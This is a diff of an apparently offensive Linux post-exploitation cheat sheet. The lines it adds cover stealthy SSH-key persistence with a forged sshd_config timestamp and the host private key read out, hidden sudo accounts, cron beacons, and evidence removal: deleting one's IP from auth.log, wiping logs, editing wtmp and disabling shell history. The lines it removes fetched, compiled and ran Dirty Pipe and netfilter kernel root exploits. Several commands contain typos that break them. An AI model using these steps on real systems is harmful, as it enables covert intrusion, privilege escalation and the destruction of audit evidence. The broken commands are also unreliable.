@@ -1,7 +1,8 @@
 if stealth is needed only edit files in `/dev/shm` as this is in memory and no logs will be created
-### Removing our IP from access logs:
-`sed -i "/<ip>/d" /var/log/auth.log`
-
+# Persistence
+## SSH Keys
+* Logs will be left in `/var/log/auth.log` and wherever they are forwarded. 
+* Also requires a SSH serer on
 ### Add SSH key without editing timestamp
 **Requires root**
 1. Copies timestamp of `sshd-config` to `/dev/shm/.f`
@@ -13,7 +14,7 @@ if stealth is needed only edit files in `/dev/shm` as this is in memory and no l
 
 Copy the timestamp of the ssh_configs timestamp 
 ```shell
-touch -r /etc/ssh/sshd_config /dev/shm/.f; sed -i '/^#AuthorizedKeysFile/ s/^#//' /etc/ssh/sshd_config && sed -i '/^AuthorizedKeysFile/ s/$/ \/etc\/ssh\/sshd_config/' /etc/ssh/sshd_config; systemctl reload sshd; touch -r /dev/shm/.f /etc/ssh/sshd_config; rm /dev/shm/.f; cat /etc/ssh/ssh_host_rsa_key
+touch -r /etc/ssh/sshd_config /dev/shm/.f; sed -i -e '/^#AuthorizedKeysFile/ s/^#//' -e '/^AuthorizedKeysFile/ s/$/ \/etc\/ssh\/sshd_config/' /etc/ssh/sshd_config; systemctl reload sshd; touch -r /dev/shm/.f /etc/ssh/sshd_config; rm /dev/shm.f; cat /etc/ssh/ssh_host_rsa_key
 ```
 Copy the ssh key to local machine
 ```shell
@@ -22,54 +23,70 @@ chmod 600 <file>
 ```shell
 ssh -i key root@<IP>
 ```
+## Account Creation
+* Make a entirely new user account. 
+* Done with the `useradd` command and add to sudo group with `usermod` then use the `passwd` command. 
+* Leaves clear logs on `/etc/passwd` and `/etc/shadow`
+* Make an account that blends in as a service or a genuine user. 
+## Cron Jobs
+* Schedule malicious code to run periodically
+* New connection established if lost after a certain amount of time
+* Highly sophisticated beacons/ implants can obfuscate by connecting at random intervals
+* These are very obvious and as such code should be place in application scheduled for tasks. 
 
-## Dirty Pipe
-**CVE-2022-0847**
-* Affects kernel versions 5.8 - 5.17
-* Android phones are affected
-```shell
-git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
-cd CVE-2022-0847-DirtyPipe-Exploits
-bash compile.sh
+# Logs
+### Removing our IP from access logs:
 ```
-Exploit 1 modifies the `/etc/passwd` and allows root privileges
-Exploit 2 can execute SUID binaries with root privilges. 
-```shell
-./exploit-2 /usr/bin/sudo
+sed -i "/<ip>/d" /var/log/auth.log`
 ```
-## Netfilter
-* Linux kernel module that provides, packet filtering, network address translation, and more. 
+Logs are stored in `/var/logs`
+### Most common logs
+```
+/var/log/messages
+/var/log/syslogs
+/var/log/auth.log
+/var/log/secure
+/var/log/kern
+/var/log/cron
+/var/log/apache2/
+/var/log/mysql/
+```
 
-Has 3 main functions
-1. Packet defragmentation
-2. Connection Tracking
-3. NAT
-* When activated, all IP packets are checked by `netfilter`
-### CVEs
-1. [CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)
-2. [CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)
-3. [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)
-
-#### CVE-2021-22555
-Kernel Version 2.6-5.11
+### Clearing up 
 ```shell
-wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
-gcc -m32 -static exploit.c -o exploit
-./exploit
+touch -a <YYYYMMDDHHMM> file
 ```
-#### CVE-2022-1015
-Kernel Version 5.4-5.6.10
 ```shell
-git clone https://github.com/Bonfee/CVE-2022-25636.git
-cd CVE-2022-25636
-make
-./exploit
+touch -m <YYYYMMDDHHMM> file
 ```
-#### CVE-2023-32233
-Kernel version up to 6.3.1
 ```shell
-git clone https://github.com/Liuk3r/CVE-2023-32233
-cd CVE-2023-32233
-gcc -Wall -o exploit exploit.c -lmnl -lnftnl
-./exploit
+touch -r <file1> <file2>
+```
+```shell
+nano /var/log/systemd
+```
+```shell
+echo "" >  /var/log.auth.log
+```
+Clear UTMP/WTMP Files
+```shell
+utmpdump /var/log/wtmp > /tmp/wtmp.log
+```
+Remove offending logs
+```shell
+nano /tmpwtmp.log
+```
+Replace binary log without file
+```shell
+utmp -r </tmp/wtmp.log > var/log/wtmp
+```
+### Initial Actions
+Disable .bash_history
+```shell
+unset HISTFILE
+```
+#### Transfer files to 
+```
+/tmp/
+/dev/shm
 ```
